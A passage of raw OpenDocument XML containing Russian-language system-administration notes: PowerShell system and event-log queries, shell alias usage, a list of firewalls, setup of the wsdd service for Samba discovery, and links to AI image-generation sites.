      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Select-Object -Property NumberOfLicensedUsers, NumberOfUsers, RegisteredUser</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Получение доступного места на диске:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Measure-Object -Property FreeSpace,Size -Sum |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Select-Object -Property Property,Sum</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сведений</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">о</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сеансе</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">входа</text:span><text:span text:style-name="T2">: Get-CimInstance -ClassName Win32_LogonSession</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отобразить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пользователя</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">вошедшего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">определенную</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">компьютерную</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">систему</text:span><text:span text:style-name="T2">: Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName</text:span></text:p>
      <text:p text:style-name="P1">Получение местного времени с компьютера: Get-CimInstance -ClassName Win32_LocalTime</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отображение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">состояния</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службы</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_Service |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Select-Object -Property Status,Name,DisplayName</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_Service |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Format-Table -Property Status, Name, DisplayName -AutoSize -Wrap</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> - команда, позволяющая создавать более краткие или более привычные псевдонимы для часто используемых команд. Команда </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> позволяет всего лишь связать псевдоним с произвольной командой. Механизм псевдонимов позволяет устанавливать более короткие или привычные имена для часто используемых команд. Еще одним преимуществом данного механизма является возможность использования в составе псевдонимов аргументов команд. Впервые данный механизм был реализован в рамках командной оболочки </text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">, после чего он был перенесен в такие командные оболочки, как </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> и другие. Синтаксис команды для установки псевдонима зависит от используемой командной оболочки. В случае командных оболочек, основанных на </text:span><text:span text:style-name="T2">Bourne</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">shell</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">ksh</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, и других, но не </text:span><text:span text:style-name="T2">sh</text:span><text:span text:style-name="T3">), синтаксис является следующим:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> &lt;псевдоним&gt;=&lt;команда&gt;</text:span></text:p>
      <text:p text:style-name="P1">В том случае, если при вызове команды должна осуществляться передача аргументов, следует использовать одинарные или двойные кавычки:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> &lt;псевдоним&gt;="&lt;команда&gt; &lt;аргумент&gt; …"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В случае же командных оболочек, основанных на </text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">tcsh</text:span><text:span text:style-name="T3"> и других), кавычки не требуются:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> &lt;псевдоним&gt; &lt;команда&gt; [аргументы …]</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Несложно заметить, что главное отличие в данном случае заключается в использовании знака равенства и необходимости использования кавычек. При вызове команды </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> без аргументов будет выведен список объявленных в текущее время псевдонимов. После установки псевдоним будет работать лишь в рамках текущей сессии командной оболочки.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Для того, чтобы активировать этот псевдоним на постоянной основе, вам придется добавить его в один из файлов конфигурации, используемой в текущее время командной оболочки. В случае командной оболочки </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> псевдонимы для отдельных пользователей чаще всего размещаются в файле конфигурации ~/.</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3">, а общесистемные псевдонимы - в файле конфигурации /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">profile</text:span><text:span text:style-name="T3">. В случае командной оболочки </text:span><text:span text:style-name="T2">tcsh</text:span><text:span text:style-name="T3"> аналогичными файлами конфигурации являются файлы ~/.</text:span><text:span text:style-name="T2">tcshrc</text:span><text:span text:style-name="T3"> и /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">login</text:span><text:span text:style-name="T3"> соответственно.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры: Простой псевдоним для пользователей операционной системы </text:span><text:span text:style-name="T2">DOS</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">="</text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P1">А это пример более сложного псевдонима:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ alias topcom='sort ~/.bash_history | uniq -ci | sort -r | less'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Данный псевдоним упрощает обращение к списку наиболее часто используемых команд и может стать шаблоном для новых псевдонимов. А это еще один пример псевдонима для ознакомления со списком смонтированных дисковых разделов:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ alias mnt='mount | grep -i /dev/[h]d[a..g] | sort'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Механизм функций командной оболочки может выполнять ту же работу, что и механизм псевдонимов, но он гораздо сложнее в использовании. В отличие от функций, псевдонимы не позволяют осуществлять подстановку значений переменных. Например, даже такая простая функция, как</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">bak</text:span><text:span text:style-name="T3"> () { </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> $1 $1.</text:span><text:span text:style-name="T2">bak</text:span><text:span text:style-name="T3"> }</text:span></text:p>
      <text:p text:style-name="P1">не может быть преобразована в псевдоним из-за использования переменной "$1".</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установка псевдонима на постоянной основе: Для установки псевдонима на постоянной основе для всех пользователей, всех командных оболочек (</text:span><text:span text:style-name="T2">ksh</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, …) и всех типов командных оболочек (использующихся и не использующихся для входа в систему) вам придется: модифицировать файл конфигурации /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">profile</text:span><text:span text:style-name="T3"> для командных оболочек, использующихся для входа в систему; модифицировать файл конфигурации /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3"> для командных оболочек, не использующихся для входа в систему.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Деактивация псевдонима: Используйте команду </text:span><text:span text:style-name="T2">unalias</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1">Подборка фаерволлов для различных ОС:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">Linux: OpenSnitch (https://github.com/evilsocket/opensnitch); gufw (https://gufw.org/)Uncomplicated Firewall (https://en.wikipedia.org/wiki/Uncomplicated_Firewall)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Windows: SimpleWall (https://github.com/henrypp/simplewall); TinyWall (https://tinywall.pados.hu/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">MacOS: LuLu (https://objective-see.org/products/lulu.html); Little Snitch (https://obdev.at/products/littlesnitch/index.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Android: NetGuard (https://play.google.com/store/apps/details?id=eu.faircode.netguard); NoRoot Firewall (https://play.google.com/store/apps/details?id=app.greyshirts.firewall); AFWall+ (https://github.com/ukanth/afwall/); RethinkDNS + Firewall (https://github.com/celzero/rethink-app)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iOS: Lockdown (https://apps.apple.com/in/app/lockdown-apps/id1469783711)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T2">Hardware: IPFire (https://www.ipfire.org/); Shorewall (https://shorewall.org/); OpenSense (https://opnsense.org/)</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">Powershell</text:span><text:span text:style-name="T3"> мониторинг событий 41, 1074, 6008. Мониторинг по событию </text:span><text:span text:style-name="T2">41:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 41} |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ForEach-Object {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>$flam = New-Object PSObject | Select-Object Date</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>if ($_.ReplacementStrings[4]) {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>$flam.Date = $_.TimeGenerated</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>$flam</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">} </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrData=[string]$flam.Date</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $StrData + " " + "Сервер: $env:computername" + " " + "Система перезагрузилась, завершив работу с ошибками. </text:span><text:span text:style-name="T3">Возможные причины ошибки: система перестала отвечать на запросы, произошел критический сбой или неожиданно отключилось питание."</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">-----------------------------------------</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Мониторинг по событию 1074:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 1074}</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pan text:style-name="T2">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$FlamDat.Action = $_.ReplacementStrings[4]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Мониторинг по событию 6008:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 6008}</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pan text:style-name="T2">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$FlamDat.Action = $_.Message</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T3">Включаем отображение </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3">-сервера в сетевом окружении </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">. В последних версиях </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">samba</text:span><text:span text:style-name="T3"> сервера больше не отображаются в сетевом окружении, при этом они нормально работают при прямом подключении к ним. Это связано с полным отказом в </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> протокола </text:span><text:span text:style-name="T2">SMB</text:span><text:span text:style-name="T3">1 и невозможностью обнаружить </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3"> по протоколу </text:span><text:span text:style-name="T2">NetBIOS</text:span><text:span text:style-name="T3">. Современные </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> системы используют для обнаружения устройств </text:span><text:span text:style-name="T2">WSD</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">Web</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Services</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Devices</text:span><text:span text:style-name="T3">) и сегодня мы расскажем, как добавить его поддержку для вашего сервера </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3">. Для включения поддержки </text:span><text:span text:style-name="T2">WSD</text:span><text:span text:style-name="T3"> нам потребуется пакет </text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">, который штатно присутствует в репозиториях </text:span><text:span text:style-name="T2">Debian</text:span><text:span text:style-name="T3"> 12 и </text:span><text:span text:style-name="T2">Ubuntu</text:span><text:span text:style-name="T3"> 22.04, если вы используете другие версии систем, то вам потребуется подключить репозиторий разработчиков, он поддерживает </text:span><text:span text:style-name="T2">Debian</text:span><text:span text:style-name="T3"> 9 - 11, и </text:span><text:span text:style-name="T2">Ubuntu</text:span><text:span text:style-name="T3"> 16.04 - 22.04. Чтобы подключить репозиторий разработчиков сначала скачайте и импортируйте в хранилище ключ: </text:span><text:span text:style-name="T2">wget</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">O</text:span><text:span text:style-name="T3">- </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">pkg</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ltec</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ch</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">conf</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ltec</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ag</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gpg</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">key</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">gpg</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">dearmour</text:span><text:span text:style-name="T3"> &gt; /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">share</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">keyrings</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gpg</text:span><text:span text:style-name="T3">. Теперь подключим сам репозиторий: </text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">deb</text:span><text:span text:style-name="T3"> [</text:span><text:span text:style-name="T2">signed</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">by</text:span><text:span text:style-name="T3">=/</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">share</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">keyrings</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gpg</text:span><text:span text:style-name="T3">] </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">pkg</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ltec</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ch</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">/ `</text:span><text:span text:style-name="T2">lsb</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">release</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cs</text:span><text:span text:style-name="T3">` </text:span><text:span text:style-name="T2">main</text:span><text:span text:style-name="T3">" &gt; /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sources</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3">. Обновим список пакетов и установим нужную нам службу:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">update</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">install</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">wsdd</text:span></text:p>
      <text:p text:style-name="P1">Пакет будет автоматически добавлен в автозагрузку и нам останется только запустить его и проверить статус:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># systemctl start wsdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># systemctl status wsdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">По умолчанию служба работает на всех интерфейсах и протоколах, если мы хотим изменить данное поведение, то следует добавить необходимые опции </text:span><text:soft-page-break/><text:span text:style-name="T3">в файл /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">default</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">, в нем находится единственная допустимая опция: </text:span><text:span text:style-name="T2">WSDD</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">PARAMS</text:span><text:span text:style-name="T3">="". В ней мы должны указать все необходимые параметры запуска согласно документации. Так, например, если мы хотим ограничить работу службы только интерфейсом </text:span><text:span text:style-name="T2">ens</text:span><text:span text:style-name="T3">33 и протоколом </text:span><text:span text:style-name="T2">IPv</text:span><text:span text:style-name="T3">4, то добавим: </text:span><text:span text:style-name="T2">WSDD</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">PARAMS</text:span><text:span text:style-name="T3">="--</text:span><text:span text:style-name="T2">interface</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ens</text:span><text:span text:style-name="T3">33 --</text:span><text:span text:style-name="T2">ipv</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">only</text:span><text:span text:style-name="T3">" Либо: </text:span><text:span text:style-name="T2">WSDD</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">PARAMS</text:span><text:span text:style-name="T3">="-</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ens</text:span><text:span text:style-name="T3">33 -4". Короткая запись проще, но не такая информативная, поэтому в конфигурационном файле мы бы советовали придерживаться длинной. После внесения изменений в настройки службу следует перезапустить: </text:span><text:span text:style-name="T2">systemctl</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">restart</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">. Для нормальной работы службы вам также нужно разрешить в брандмауэре входящие соединения для </text:span><text:span text:style-name="T2">UDP</text:span><text:span text:style-name="T3"> 3702 и </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3"> 5357. Со стороны </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> делать ничего не нужно, </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3">-сервера автоматически появятся в вашем сетевом окружении.</text:span></text:p>
      <text:p text:style-name="P1">Представляю первую часть подборки легендарных сервисов:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">unrealperson</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - лица людей;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thismodeldoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">co</text:span><text:span text:style-name="T3">/ - инстаграмные фото «модели»;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thishottieisnotreal</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - красивые женщины;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thiswaifudoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/ - аниме персонажи;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thisautomobiledoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - автомобили;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thisfoodblogdoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - крутые фото еды;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thisgraffitidoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - граффити;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thisrentaldoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - номера отелей;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">9. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">imgflip</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">meme</text:span><text:span text:style-name="T3"> - мемы (неплохие!);</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">10. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thispersondoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - лица людей.</text:span></text:p>
      <text:p text:style-name="P13">Команды для получения сведений о системе, активности пользователей:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">date</text:span><text:span text:style-name="T3"> - вывести текущую дату и время</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cal</text:span><text:span text:style-name="T3"> - вывести календарь на текущий месяц</text:span></text:p>
